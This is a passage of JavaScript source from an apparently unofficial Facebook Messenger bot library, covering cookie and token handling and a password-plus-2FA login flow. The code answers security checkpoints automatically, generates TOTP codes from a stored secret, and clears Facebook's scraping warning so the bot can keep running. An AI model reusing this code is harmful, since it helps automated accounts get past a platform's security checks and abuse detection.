Gecko) Chrome/137.0.0.0 Safari/537.36');\n                        break;\n                    }\n                    case 'proxy': {\n                        if (typeof options.proxy != \"string\") {\n                            delete globalOptions.proxy;\n                            utils.setProxy();\n                        } else {\n                            globalOptions.proxy = options.proxy;\n                            utils.setProxy(globalOptions.proxy);\n                        }\n                        break;\n                    }\n                    default: {\n                        log.warn(\"setOptions\", \"Unrecognized option given to setOptions: \" + key);\n                        break;\n                    }\n                }\n                break;\n            }\n        }\n    });\n}\n\nfunction buildAPI(globalOptions, html, jar) {\n    let fb_dtsg = null;\n    let irisSeqID = null;\n\n    function getFBDTSG(html) {\n        let match = html.match(/\\[\"DTSGInitialData\",\\[\\],{\"token\":\"([^\"]+)\"}/);\n        if (match) {\n            return match[1].replace(/\\\\/g, '');\n        }\n        match = html.match(/{\"token\":\"([^\"]+)\",\"async_get_token\"/);\n        if (match) {\n            logger.Normal(\"Found fb_dtsg in async_get_token pattern\");\n            return match[1];\n        }\n        match = html.match(/<input type=\"hidden\" name=\"fb_dtsg\" value=\"([^\"]+)\"/);\n        if (match) {\n            logger.Normal(\"Found fb_dtsg in input field pattern\");\n            return match[1];\n        }\n\n        logger.Warning(\"Could not find fb_dtsg in any pattern\");\n        return null;\n    }\n\n    fb_dtsg = getFBDTSG(html);\n    irisSeqID = (html.match(/irisSeqID\":\"([^\"]+)\"/) || [])[1];\n\n    if (fb_dtsg) logger.Normal(\"Process OnLogin\");\n\n    var userID = (jar.getCookies(\"https://www.facebook.com\")\n        .filter(cookie => [\"c_user\", \"i_user\"].includes(cookie.key))\n        .pop() || {}).value;\n\n    if (!userID) {\n        throw { \n            error: \"NO_USER_ID\", \n            message: \"Login successful but could not retrieve userID from cookies. The appState is likely invalid.\" \n        };\n    }\n\n    process.env['UID'] = logger.Normal(getText(Language.UID, userID), userID);\n    let needWarningHandle = false;\n    let mqttEndpoint, region;\n\n    const endpointMatch = html.match(/\"endpoint\":\"([^\"]+)\"/);\n    if (endpointMatch) {\n        mqttEndpoint = endpointMatch[1].replace(/\\\\\\//g, '/');\n        const url = new URL(mqttEndpoint);\n        region = url.searchParams.get('region')?.toUpperCase() || \"PRN\";\n        \n        logger.Normal(`MQTT Region: ${region}`);\n\n        if (endpointMatch.input.includes(\"601051028565049\")) {\n            logger.Warning(\"T√†i kho·∫£n ƒë√£ b·ªã d√≠nh auto!\");\n            needWarningHandle = true;\n        }\n    } else {\n        logger.Warning('S·ª≠ d·ª•ng MQTT endpoint m·∫∑c ƒë·ªãnh');\n        mqttEndpoint = `wss://edge-chat.facebook.com/chat?region=prn&sid=${userID}`;\n        region = \"PRN\";\n    }\n\n    var ctx = {\n        userID,\n        jar,\n        clientID: utils.getGUID(),\n        globalOptions,\n        loggedIn: true,\n        access_token: 'NONE',\n        clientMutationId: 0,\n        mqttClient: undefined,\n        lastSeqId: irisSeqID,\n        syncToken: undefined,\n        mqttEndpoint,\n        region,\n        firstListen: true,\n        fb_dtsg,\n        req_ID: 0,\n        lastPresence: Date.now(),\n        debug: false\n    };\n\n    var defaultFuncs = utils.makeDefaults(html, userID, ctx);\n\n    async function clearWarning(retries = 0) {\n        try {\n            const form = {\n                av: userID,\n                fb_api_caller_class: \"RelayModern\",\n                fb_api_req_friendly_name: \"FBScrapingWarningMutation\",\n                doc_id: \"6339492849481770\",\n                variables: JSON.stringify({}),\n                server_timestamps: true,\n                fb_dtsg: ctx.fb_dtsg\n            };\n\n            const res = await defaultFuncs.post(\"https://www.facebook.com/api/graphql/\", jar, form, globalOptions);\n            const data = JSON.parse(res.body);\n\n            if (data.data?.fb_scraping_warning_clear?.success) {\n                logger.Normal(\"ƒê√£ x·ª≠ l√Ω th√†nh c√¥ng c·∫£nh b√°o t√†i kho·∫£n!\");\n                logger.Normal(\"ƒêang kh·ªüi ƒë·ªông l·∫°i bot...\");\n                await new Promise(resolve => setTimeout(resolve, 2000));\n                exec('node index.js', { stdio: 'inherit' });\n                process.exit(1);\n            }\n\n            if (retries < 2) {\n                await new Promise(resolve => setTimeout(resolve, 1000));\n                return await clearWarning(retries + 1);\n            }\n\n            return false;\n\n        } catch (e) {\n            logger.Error(\"L·ªói khi x·ª≠ l√Ω c·∫£nh b√°o:\", e);\n            return false;\n        }\n    }\n\n    var api = {\n        setOptions: setOptions.bind(null, globalOptions),\n        getAppState: () => utils.getAppState(jar),\n        \n        refreshDTSG: async function() {\n            try {\n                const res = await defaultFuncs.get('https://www.facebook.com/settings', jar, null, globalOptions);\n                let newDtsg = null;\n\n                let match = res.body.match(/\\[\"DTSGInitialData\",\\[\\],{\"token\":\"([^\"]+)\"}/);\n                if (match) {\n                    logger.Normal(\"Refreshed fb_dtsg from DTSGInitialData\");\n                    newDtsg = match[1].replace(/\\\\/g, '');\n                }\n\n                if (!newDtsg) {\n                    match = res.body.match(/{\"token\":\"([^\"]+)\",\"async_get_token\"/);\n                    if (match) {\n                        logger.Normal(\"Refreshed fb_dtsg from async_get_token\");\n                        newDtsg = match[1];\n                    }\n                }\n\n                if (!newDtsg) {\n                    match = res.body.match(/<input type=\"hidden\" name=\"fb_dtsg\" value=\"([^\"]+)\"/);\n                    if (match) {\n                        logger.Normal(\"Refreshed fb_dtsg from input field\");\n                        newDtsg = match[1];\n                    }\n                }\n\n                if (!newDtsg) {\n                    logger.Warning(\"Failed to refresh fb_dtsg - no pattern matched\");\n                    return ctx.fb_dtsg;\n                }\n\n                logger.Normal(\"Successfully refreshed fb_dtsg\");\n                ctx.fb_dtsg = newDtsg;\n                return newDtsg;\n\n            } catch (error) {\n                logger.Warning(\"Error while refreshing fb_dtsg:\", error.message);\n                return ctx.fb_dtsg;\n            }\n        },\n\n        sendRequest: async function(url, form = {}, qs = {}) {\n            if (!form.fb_dtsg && ctx.fb_dtsg) {\n                form.fb_dtsg = ctx.fb_dtsg;\n            }\n\n            try {\n                const res = await defaultFuncs.post(url, ctx.jar, form, qs);\n                \n                if (res.body.includes('invalid_fb_dtsg')) {\n                    logger.Warning(\"Invalid fb_dtsg detected, refreshing...\");\n                    await this.refreshDTSG();\n                    form.fb_dtsg = ctx.fb_dtsg;\n                    return await defaultFuncs.post(url, ctx.jar, form, qs);\n                }\n\n                return res;\n\n            } catch (error) {\n                throw error;\n            }\n        },\n\n        postFormData: function(url, body) {\n            return defaultFuncs.postFormData(url, ctx.jar, body);\n        },\n\n        clearWarning: async function() {\n            return await clearWarning();\n        }\n    };\n\n    if (needWarningHandle) {\n        clearWarning().catch(e => logger.Warning(\"Kh√¥ng th·ªÉ x·ª≠ l√Ω c·∫£nh b√°o:\", e));\n    }\n\n    fs.readdirSync(__dirname + \"/src\")\n        .filter(f => f.endsWith(\".js\") && !f.includes('Dev_'))\n        .forEach(f => {\n            const name = f.split('.')[0];\n            if ((f === 'getThreadInfo.js' && !global.Fca.Require.FastConfig.AntiGetInfo.AntiGetThreadInfo) || \n                (f === 'getUserInfo.js' && !global.Fca.Require.FastConfig.AntiGetInfo.AntiGetUserInfo)) {\n                api[name] = require(`./src/${f.includes('getThreadInfo') ? 'getThreadMain.js' : 'getUserInfoMain.js'}`)(defaultFuncs, api, ctx);\n            } else {\n                api[name] = require(`./src/${f}`)(defaultFuncs, api, ctx);\n            }\n        });\n\n    return {ctx, defaultFuncs, api};\n}\n\nfunction makeLogin(jar, email, password, loginOptions, callback, prCallback) {\n    return function(res) {\n        var html = res.body,$ = cheerio.load(html),arr = [];\n\n        $(\"#login_form input\").map((i, v) => arr.push({ val: $(v).val(), name: $(v).attr(\"name\") }));\n\n        arr = arr.filter(function(v) {\n            return v.val && v.val.length;\n        });\n        var form = utils.arrToForm(arr);\n            form.lsd = utils.getFrom(html, \"[\\\"LSD\\\",[],{\\\"token\\\":\\\"\", \"\\\"}\");\n            form.lgndim = Buffer.from(\"{\\\"w\\\":1440,\\\"h\\\":900,\\\"aw\\\":1440,\\\"ah\\\":834,\\\"c\\\":24}\").toString('base64');\n            form.email = email;\n            form.pass = password;\n            form.default_persistent = '0';\n            form.locale = 'en_US';       \n            form.timezone = '240';\n            form.lgnjs = ~~(Date.now() / 1000);\n\n        html.split(\"\\\"_js_\").slice(1).map((val) => {\n            jar.setCookie(utils.formatCookie(JSON.parse(\"[\\\"\" + utils.getFrom(val, \"\", \"]\") + \"]\"), \"facebook\"),\"https://www.facebook.com\")\n        });\n        return utils\n            .post(\"https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110\", jar, form, loginOptions)\n            .then(utils.saveCookies(jar))\n            .then(function(/** @type {{ headers: any; }} */res) {\n                var headers = res.headers;  \n                if (!headers.location) throw { error: Language.InvaildAccount };\n\n                if (headers.location.indexOf('https://www.facebook.com/checkpoint/') > -1) {\n                    logger.Warning(Language.TwoAuth);\n                    var nextURL = 'https://www.facebook.com/checkpoint/?next=https%3A%2F%2Fwww.facebook.com%2Fhome.php';\n\n                    return utils\n                        .get(headers.location, jar, null, loginOptions)\n                        .then(utils.saveCookies(jar))\n                        .then(function(res) {\n                            if (!Database().get('ThroughAcc')) {\n                                Database().set('ThroughAcc', email);\n                            }\n                            else {\n                                if (String((Database().get('ThroughAcc'))).replace(RegExp('\"','g'), '') != String(email).replace(RegExp('\"','g'), '')) {\n                                    Database().set('ThroughAcc', email);\n                                    if (Database().get('Through2Fa')) {\n                                        Database().delete('Through2Fa');\n                                    }\n                                }\n                            }\n                            var html = res.body,$ = cheerio.load(html), arr = [];\n                            $(\"form input\").map((i, v) => arr.push({ val: $(v).val(), name: $(v).attr(\"name\") }));\n                            arr = arr.filter(v => { return v.val && v.val.length });\n                            var form = utils.arrToForm(arr);\n                            if (html.indexOf(\"checkpoint/?next\") > -1) {\n                                setTimeout(() => {\n                                    checkVerified = setInterval((_form) => {}, 5000, {\n                                        fb_dtsg: form.fb_dtsg,\n                                        jazoest: form.jazoest,\n                                        dpr: 1\n                                    });\n                                }, 2500);  \n                                switch (global.Fca.Require.FastConfig.Login2Fa) {\n                                    case true: {\n                                        const question = question => {\n                                            const rl = readline.createInterface({\n                                                input: process.stdin,\n                                                output: process.stdout\n                                            });\n                                            var done,answ;\n                                                rl.question(question, answer => {\n                                                    rl.close();\n                                                    answ = answer;\n                                                    done = true\n                                                })\n                                                deasync.loopWhile(function(){\n                                                    return !done;\n                                                });\n                                            return answ;\n                                        };\n                                        try {\n                                            const Old_Cookie = Database().get('Through2Fa');\n                                                if (Old_Cookie) {\n                                                    Old_Cookie.map(function(/** @type {{ key: string; value: string; expires: string; domain: string; path: string; }} */c) {\n                                                        let str = c.key + \"=\" + c.value + \"; expires=\" + c.expires + \"; domain=\" + c.domain + \"; path=\" + c.path + \";\";\n                                                        jar.setCookie(str, \"http://\" + c.domain);\n                                                    });\n                                                    let Form = utils.arrToForm(arr);\n                                                        Form.lsd = utils.getFrom(html, \"[\\\"LSD\\\",[],{\\\"token\\\":\\\"\", \"\\\"}\");\n                                                        Form.lgndim = Buffer.from(\"{\\\"w\\\":1440,\\\"h\\\":900,\\\"aw\\\":1440,\\\"ah\\\":834,\\\"c\\\":24}\").toString('base64');\n                                                        Form.email = email;\n                                                        Form.pass = password;\n                                                        Form.default_persistent = '0';\n                                                        Form.locale = 'en_US';\n                                                        Form.timezone = '240';\n                                                        Form.lgnjs = ~~(Date.now() / 1000);\n                                                    return utils\n                                                        .post(\"https://www.facebook.com/login/device-based/regular/login/?login_attempt=1&lwv=110\", jar, Form, loginOptions)\n                                                        .then(utils.saveCookies(jar))\n                                                    .then(function(res) {\n                                                            let headers = res.headers\n                                                                if (!headers['set-cookie'][0].includes('deleted')) {\n                                                                    logger.Warning(Language.ErrThroughCookies, function() {\n                                                                        Database().delete('Through2Fa');\n                                                                    });\n                                                                    process.exit(1);\n                                                                }\n                                                        if (headers.location && headers.location.indexOf('https://www.facebook.com/checkpoint/') > -1) {\n                                                            return utils\n                                                                .get(headers.location, jar, null, loginOptions)\n                                                                .then(utils.saveCookies(jar))\n                                                                .then(function(res) {\n                                                                    var html = res.body,$ = cheerio.load(html), arr = [];\n                                                                    $(\"form input\").map((i, v) => arr.push({ val: $(v).val(), name: $(v).attr(\"name\") }));\n                                                                    arr = arr.filter(v => { return v.val && v.val.length });\n                                                                    var Form = utils.arrToForm(arr);\n\n                                                                    if (html.indexOf(\"checkpoint/?next\") > -1) {\n                                                                        setTimeout(() => {\n                                                                            checkVerified = setInterval((_form) => {}, 5000, {\n                                                                                fb_dtsg: Form.fb_dtsg,\n                                                                                jazoest: Form.jazoest,\n                                                                                dpr: 1\n                                                                            });\n                                                                        }, 2500);\n\n                                                                        if (!res.headers.location && res.headers['set-cookie'][0].includes('checkpoint')) {\n                                                                            try {\n                                                                                delete Form.name_action_selected;\n                                                                                Form['submit[Continue]'] = $(\"#checkpointSubmitButton\").html();\n                                                                                return utils\n                                                                                    .post(nextURL, jar, Form, loginOptions)\n                                                                                    .then(utils.saveCookies(jar))\n                                                                                    .then(function() {\n                                                                                        Form['submit[This was me]'] = \"This was me\";\n                                                                                        return utils.post(nextURL, jar, Form, loginOptions).then(utils.saveCookies(jar));\n                                                                                    })\n                                                                                    .then(function() {\n                                                                                        delete Form['submit[This was me]'];\n                                                                                        Form.name_action_selected = 'save_device';\n                                                                                        Form['submit[Continue]'] = $(\"#checkpointSubmitButton\").html();\n                                                                                        return utils.post(nextURL, jar, Form, loginOptions).then(utils.saveCookies(jar));\n                                                                                    })\n                                                                                    .then(function(res) {\n                                                                                        var headers = res.headers;\n                                                                                        if (!headers.location && res.headers['set-cookie'][0].includes('checkpoint')) {\n                                                                                            Database().delete('Through2Fa');\n                                                                                            process.exit(1);\n                                                                                        }\n                                                                                        var appState = utils.getAppState(jar,false);\n                                                                                        Database().set('Through2Fa', appState);\n                                                                                        return loginHelper(appState, email, password, loginOptions, callback);\n                                                                                    })\n                                                                                    .catch((e) => callback(e));\n                                                                            }\n                                                                            catch (e) {\n                                                                                console.log(e)\n                                                                            }\n                                                                        }\n                                                                    }\n                                                                })\n                                                        }\n                                                        return utils.get('https://www.facebook.com/', jar, null, loginOptions).then(utils.saveCookies(jar));\n                                                    })\n                                                    .catch((e) => console.log(e));\n                                                }\n                                        }\n                                        catch (e) {\n                                            Database().delete('Through2Fa');\n                                        }\n                                        const Otp_code = require('totp-generator');\n                                        const Code = global.Fca.Require.FastConfig.AuthString.includes('|') == false ? Otp_code(global.Fca.Require.FastConfig.AuthString.includes(\" \") ? global.Fca.Require.FastConfig.AuthString.replace(RegExp(\" \", 'g'), \"\") : global.Fca.Require.FastConfig.AuthString) :  question(Language.EnterSecurityCode); \n                                                try {\n                                                    const approvals = function(N_Code) { \n                                                        form.approvals_code = N_Code;\n                                                        form['submit[Continue]'] = $(\"#checkpointSubmitButton\").html();\n                                                        var prResolve,prReject;\n                                                        var rtPromise = new Promise((resolve, reject) => { prResolve = resolve; prReject = reject; });\n\n                                                        if (typeof N_Code == \"string\") {\n                                                            utils\n                                                                .post(nextURL, jar, form, loginOptions)\n                                                                .then(utils.saveCookies(jar))\n                                                                .then(function(res) {\n                                                                    var $ = cheerio.load(res.body);\n                                                                    var error = $(\"#approvals_code\").parent().attr(\"data-xui-error\");\n                                                                    if (error) {\n                                                                        logger.Warning(Language.InvaildTwoAuthCode,function() { approvals(question(Language.EnterSecurityCode)) }); //bruh loop\n                                                                    };\n                                                                })\n                                                                .then(function() {\n                                                                    delete form.no_fido;delete form.approvals_code;\n                                                                    form.name_action_selected = 'save_device'; //'save_device' || 'dont_save;\n                                                                    return utils.post(nextURL, jar, form, loginOptions).then(utils.saveCookies(jar));\n                                                                }) \n                                                                .then(function(res) {\n                                                                    var headers = res.headers;\n                                                                    if (!headers.location && res.headers['set-cookie'][0].includes('checkpoint')) {\n                                                                        try {\n                                                                            delete form.name_action_selected;\n                                                                            form['submit[Continue]'] = $(\"#checkpointSubmitButton\").html();\n                                                                            return utils\n                                                                                .post(nextURL, jar, form, loginOptions)\n                                                                                .then(utils.saveCookies(jar))\n                                                                                .then(function() {\n                                                                                    form['submit[This was me]'] = \"This was me\";\n                                                                                    return utils.post(nextURL, jar, form, loginOptions).then(utils.saveCookies(jar));\n                                                                                })\n                                                                                .then(function() {\n                                                                                    delete form['submit[This was me]'];\n                                                                                    form.name_action_selected = 'save_device';\n                                                                                    form['submit[Continue]'] = $(\"#checkpointSubmitButton\").html();\n                                                                                    return utils.post(nextURL, jar, form, loginOptions).then(utils.saveCookies(jar));\n                                                                                })\n                                                                                .then(function(res) {\n                                                                                    var headers = res.headers;\n                                                                                    if (!headers.location && res.headers['set-cookie'][0].includes('checkpoint')) throw { error: \"wtf ??:D\" };\n                                                                                    var appState = utils.getAppState(jar,false);\n                                                                                    Database().set('Through2Fa', appState);\n                                                                                    return loginHelper(appState, email, password, loginOptions, callback);\n                                                                                })\n                                                                                .catch((e) => callback(e));\n                                                                        }\n                                                                        catch (e) {\n                                                                            console.log(e)\n                                                                        }\n                                                                    }\n                                                                    var appState = utils.getAppState(jar,false);\n                                                                    if (callback === prCallback) {\n                                                                        callback = function(err, api) {\n                                                                            if (err) return prReject(err);\n                                                                            return prResolve(api);\n                                                                        };\n                                                                    }\n                                                                    Database().set('Through2Fa', appState);\n                                                                    return loginHelper(appState, email, password, loginOptions, callback);\n                                                                })\n                                                                .catch(function(err) {\n                                                                        if (callback === prCallback) prReject(err);\n                                                                        else callback(err);\n                                                                });\n                                                        }\n                                                        else {\n                                                            utils\n                                                                .post(\"https://www.facebook.com/checkpoint/?next=https%3A%2F%2Fwww.facebook.com%2Fhome.php\", jar, form, loginOptions, null, { \"Referer\": \"https://www.facebook.com/checkpoint/?next\" })\n                                                                .then(utils.saveCookies(jar))\n                                                                .then((res) => {\n                                                                    try { \n                                                                        JSON.parse(res.body.replace(/for\\s*\\(\\s*;\\s*;\\s*\\)\\s*;\\s*/, \"\"));\n                                                                    } catch (ex) {\n                                                                        clearInterval(checkVerified);\n                                                                        logger.Warning(Language.VerifiedCheck);\n                                                                        if (callback === prCallback) {\n                                                                            callback = function(err, api) {\n                                                                                if (err) return prReject(err);\n                                                                                return prResolve(api);\n                                                                            };\n                                                                        }\n                                                                        return loginHelper(utils.getAppState(jar,false), email, password, loginOptions, callback);\n                                                                    }\n                                                                })\n                                                                .catch((ex) => {\n                                                                    log.error(\"login\", ex);\n                                                                    if (callback === prCallback) prReject(ex);\n                                                                    else callback(ex);\n                                                                });\n                                                            }\n                                                        return rtPromise;\n                                                    }\n                                                    return approvals(Code)\n                                                }\n                                                catch (e) {\n                                                    logger.Error(e)\n                                                    logger.Error();\n                                                    process.exit(0);\n                                                }\n                                            } \n                                    case false: {\n                                        throw {\n                                            error: 'login-approval',\n                                            continue: function submit2FA(code) {\n                                                form.approvals_code = code;\n                                                form['submit[Continue]'] = $(\"#checkpointSubmitButton\").html(); //'Continue';\n                                                var prResolve,prReject;\n                                                var rtPromise = new Promise((resolve, reject) => { prResolve = resolve; prReject = reject; });\n                                                if (typeof code == \"string\") {\n                                                    utils\n                                                        .post(nextURL, jar, form, loginOptions)\n                                                        .then(utils.saveCookies(jar))\n                                                        .then(function(/** @type {{ body: string | Buffer; }} */res) {\n                                                            var $ = cheerio.load(res.body);\n                                                            var error = $(\"#approvals_code\").parent().attr(\"data-xui-error\");\n                                                            if (error) {\n                                                                throw {\n                                                                    error: 'login-approval',\n                                                                    errordesc: Language.InvaildTwoAuthCode,\n                                                                    lerror: error,\n                                                                    continue: submit2FA\n                                                                };\n                                                            }\n                                                        })\n                                                        .then(function() {\n                                                            delete form.no_fido;delete form.approvals_code;\n                                                            form.name_action_selected = 'dont_save'; //'save_device' || 'dont_save;\n                                                            return utils.post(nextURL, jar, form, loginOptions).then(utils.saveCookies(jar));\n                                                        })\n                                                        .then(function(res) {\n                                                            var headers = res.headers;\n                                                            if (!headers.location && res.headers['set-cookie'][0].includes('checkpoint')) throw { error: Language.ApprovalsErr };\n                                                            var appState = utils.getAppState(jar,false);\n                                                            if (callback === prCallback) {\n                                                                callback = function(err, api) {\n                                                                    if (err) return prReject(err);\n                                                                    return prResolve(api);\n                                                                };\n                                                            }\n                                                            return loginHelper(appState, email, password, loginOptions, callback);\n                                                        })\n                                                        .catch(function(err) {\n                                                            if (callback === prCallback) prReject(err);\n                                                            else callback(err);\n                                                        });\n                                                } else {\n                                                    utils\n                                                        .post(\"https://www.facebook.com/checkpoint/?next=https%3A%2F%2Fwww.facebook.com%2Fhome.php\", jar, form, loginOptions, null, { \"Referer\": \"https://www.facebook.com/checkpoint/?next\" })\n                                                        .then(utils.saveCookies(jar))\n                                                        .then((res) => {\n                                                            try { \n                                                                JSON.parse(res.body.replace(/for\\s*\\(\\s*;\\s*;\\s*\\)\\s*;\\s*/, \"\"));\n                                                            } catch (ex) {\n                                                                clearInterval(checkVerified);\n                                                                logger.Warning(Language.VerifiedCheck);\n                                                                if (callback === prCallback) {\n                                                                    callback = function(err, api) {\n                                                                        if (err) return prReject(err);\n                                                                        return prResolve(api);\n                                                                    };\n                                                                }\n                                                                return loginHelper(utils.getAppState(jar,false), email, password, loginOptions, callback);\n                                                            }\n                                                        })\n                                                        .catch((ex) => {\n                                                            log.error(\"login\", ex);\n                                                            if (callback === prCallback) prReject(ex);\n                                                            else callback(ex);\n                                                        });\n                                                    }\n                                                return rtPromise;\n                                            }\n                                        };\n                                    }\n                                }\n                            }\n                        });\n                }\n                return utils.get('https://www.facebook.com/', jar, null, loginOptions).then(utils.saveCookies(jar));\n            });\n    };\n}\n\nfunction backup(data,globalOptions, callback, prCallback) {\n    try {\n        var appstate;\n        try {\n            appstate = JSON.parse(data)\n        }\n        catch(e) {\n            appstate = data;\n        }\n            logger.Warning(Language.BackupNoti);\n        try {\n            loginHelper(appstate,null,null,globalOptions, callback, prCallback)\n        }\n        catch (e) {\n            logger.Error(Language.ErrBackup);\n            process.exit(0);\n        }\n    }\n    catch (e) {\n        return logger.Error();\n    }\n}\n\nfunction loginHelper(appState, email, password, globalOptions, callback, prCallback) {\n    var mainPromise = null;\n    var jar = utils.getJar();\n\n    try {\n        if (appState) {\n            switch (Database().has(\"FBKEY\")) {\n                case true: {\n                    process.env.FBKEY = Database().get(\"FBKEY\");\n                }\n                    break;\n                case false: {\n                    const SecurityKey = global.Fca.Require.Security.create().apiKey;\n                        process.env['FBKEY'] = SecurityKey;\n                    Database().set('FBKEY', SecurityKey);\n                }\n                    break;\n                default: {\n                    const SecurityKey = global.Fca.Require.Security.create().apiKey;\n                        process.env['FBKEY'] = SecurityKey;\n                    Database().set('FBKEY', SecurityKey);\n                }\n            }\n            try {\n                switch (global.Fca.Require.FastConfig.EncryptFeature) {\n                    case true: {\n                        appState = JSON.parse(JSON.stringify(appState, null, \"\\t\"));\n                        switch (utils.getType(appState)) {\n                            case \"Array\": {\n                                switch (utils.getType(appState[0])) {\n                                    case \"Object\": {\n                                        logger.Normal(Language.NotReadyToDecrypt);\n                                    }\n                                        break;\n                                    case \"String\": {\n                                        appState = Security(appState,process.env['FBKEY'],'Decrypt');\n                                        logger.Normal(Language.DecryptSuccess);\n                                    }\n                                        break;\n                                    default: {\n                                        logger.Warning(Language.InvaildAppState);\n                                        process.exit(0)\n                                    }\n                                }\n                            }\n                                break;\n                            default: {\n                                logger.Warning(Language.InvaildAppState);\n                                process.exit(0)\n                            }\n                        } \n                    }\n                        break;\n                    case false: {\n                        switch (utils.getType(appState)) { \n                            case \"Array\": {\n                                switch (utils.getType(appState[0])) {\n                                    case \"Object\": {\n                                        logger.Normal(Language.EncryptStateOff);\n                                    }\n                                        break;\n                                    case \"String\": {\n                                        appState = Security(appState,process.env['FBKEY'],'Decrypt');\n                                        logger.Normal(Language.EncryptStateOff);\n                                        logger.Normal(Language.DecryptSuccess);\n                                    }\n                                        break;\n                                    default: {\n                                        logger.Warning(Language.InvaildAppState);\n                                        process.exit(0)\n                                    }\n                                }\n                            }\n                                break;\n                            default: {\n                                logger.Warning(Language.InvaildAppState);\n                                process.exit(0)\n                            }\n                        } \n                    }\n                        break;\n                    default: {\n                        logger.Warning(getText(Language.IsNotABoolean,global.Fca.Require.FastConfig.EncryptFeature))\n                        process.exit(0);\n                    }\n                }\n            }\n            catch (e) {\n                console.log(e);\n            }\n\n            try {\n                appState = JSON.parse(appState);\n            }\n            catch (e) {\n                try {\n                    appState = appState;\n                }\n                catch (e) {\n                    return logger.Error();\n                }\n            }\n\n            try {\n                global.Fca.Data.AppState = appState;\n                appState.map(function(c) {\n                    var str = c.key + \"=\" + c.value + \"; expires=\" + c.expires + \"; domain=\" + c.domain + \"; path=\" + c.path + \";\";\n                    jar.setCookie(str, \"http://\" + c.domain);\n                });\n                Database().set('Backup', appState);\n                mainPromise = utils.get('https://www.facebook.com/', jar, null, globalOptions, { noRef: true }).then(utils.saveCookies(jar));\n            } \n            catch (e) {\n                // This will be caught by the main promise's catch block\n                throw new Error(\"Could not process the provided appState. It might be corrupted or invalid.\");\n            }\n        }   \n        else {\n            mainPromise = utils\n                .get(\"https://www.facebook.com/\", null, null, globalOptions, { noRef: true })\n                .then(utils.saveCookies(jar))\n                .then(makeLogin(jar, email, password, globalOptions, callback, prCallback))\n                .then(function() {\n                    return utils.get('https://www.facebook.com/', jar, null, globalOptions).then(utils.saveCookies(jar));\n                });\n        }\n    } catch (e) {\n        // This initial catch is for synchronous errors during setup\n        log.error(\"login-sync\", e.error || e);\n        return handleLoginFailure();\n    }\n\n    function handleRedirect(res) {\n        var reg = /<meta http-equiv=\"refresh\" content=\"0;url=([^\"]+)[^>]+>/;\n        var redirect = reg.exec(res.body);\n        if (redirect && redirect[1]) {\n            return utils.get(redirect[1], jar, null, globalOptions).then(utils.saveCookies(jar));\n        }\n        return res;\n    }\n\n    var ctx, api;\n    mainPromise = mainPromise\n        .then(handleRedirect)\n        .then(function(res) {\n            let Regex_Via = /MPageLoadClientMetrics/gs; \n            if (!Regex_Via.test(res.body)) {\n                globalOptions.userAgent = \"Mozilla/5.0 (Linux; Android 10; K) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/137.0.0.0 Safari/537.36\";\n                return utils.get('https://www.facebook.com/', jar, null, globalOptions, { noRef: true }).then(utils.saveCookies(jar));\n            }\n            return res;\n        })\n        .then(handleRedirect)\n        .then(function(res) {\n            var html = res.body;\n            var Obj = buildAPI(globalOptions, html, jar);\n            ctx = Obj.ctx;\n            api = Obj.api;\n            return res;\n        });\n\n    if (globalOptions.pageID) {\n        mainPromise = mainPromise\n            .then(function() {\n                return utils.get('https://www.facebook.com/' + ctx.globalOptions.pageID + '/messages/?section=messages&subsection=inbox', ctx.jar, null, globalOptions);\n            })\n            .then(function(resData) {\n                var url = utils.getFrom(resData.body, 'window.location.replace(\"https:\\\\/\\\\/www.facebook.com\\\\', '\");').split('\\\\').join('');\n                url = url.substring(0, url.length - 1);\n                return utils.get('https://www.facebook.com' + url, ctx.jar, null, globalOptions);\n            });\n    }\n\n    mainPromise\n        .then(async() => { \n            callback(null, api);\n        })\n        .catch(function(e) {\n            log.error(\"login\", e.error || e);\n            return handleLoginFailure();\n        });\n}\n\nfunction setUserNameAndPassWord() {\n    const rl = readline.createInterface({\n        input: process.stdin,\n        output: process.stdout\n    });\n\n    // Clear console and show cool heading\n    console.clear();\n    console.log(\n        chalk.hex('#00FFFF')(\n            figlet.textSync('PCODER', {\n                font: 'ANSI Shadow',\n                horizontalLayout: 'default',\n                verticalLayout: 'default',\n                width: 80,\n                whitespaceBreak: true\n            })\n        )\n    );\n\n    // Info box\n    const infoBox = [\n        chalk.hex('#FFB300').bold('‚îå‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îê'),\n        chalk.hex('#FFB300').bold('‚îÇ ') + chalk.hex('#00FF99')('OS: ') + chalk.hex('#FFD700')(os.type()),\n        chalk.hex('#FFB300').bold('‚îÇ ') + chalk.hex('#00FF99')('Version: ') + chalk.hex('#FFD700')(os.version()),\n        chalk.hex('#FFB300').bold('‚îÇ ') + chalk.hex('#00FF99')('FCA: ') + chalk.hex('#FFD700')(global.Fca.Version),\n        chalk.hex('#FFB300').bold('‚îî‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îÄ‚îò')\n    ].join('\\n');\n    console.log(infoBox);\n\n    // Instructions\n    console.log(\n        chalk.bgHex('#6600CC').bold(\n            '\\n[!] ƒê·ªÉ s·ª≠ d·ª•ng AutoLogin, b·∫°n c·∫ßn b·∫≠t b·∫£o m·∫≠t 2FA cho t√†i kho·∫£n Facebook!\\n'\n        )\n    );\n    console.log(\n        chalk.hex('#FF69B4').italic('L∆∞u √Ω: N√™n d√πng key 2FA d·∫°ng base32, KH√îNG d√πng m√£ 6 s·ªë (code)!\\n')\n    );\n\n    // Prompts\n    const typeAccountPrompt = Language.TypeAccount || chalk.hex('#00FFFF')(\"Nh·∫≠p email/SƒêT Facebook: \");\n    const typePasswordPrompt = Language.TypePassword || chalk.hex('#FFA500')(\"Nh·∫≠p m·∫≠t kh·∫©u Facebook: \");\n    const type2FAPrompt = Language.Type2FA || chalk.hex('#FF00FF')(\"Nh·∫≠p 2FA secret key (ƒë·ªÉ tr·ªëng n·∫øu kh√¥ng c√≥): \");\n\n    rl.question(typeAccountPrompt, (Account) => {\n        if (!Account.includes(\"@\") 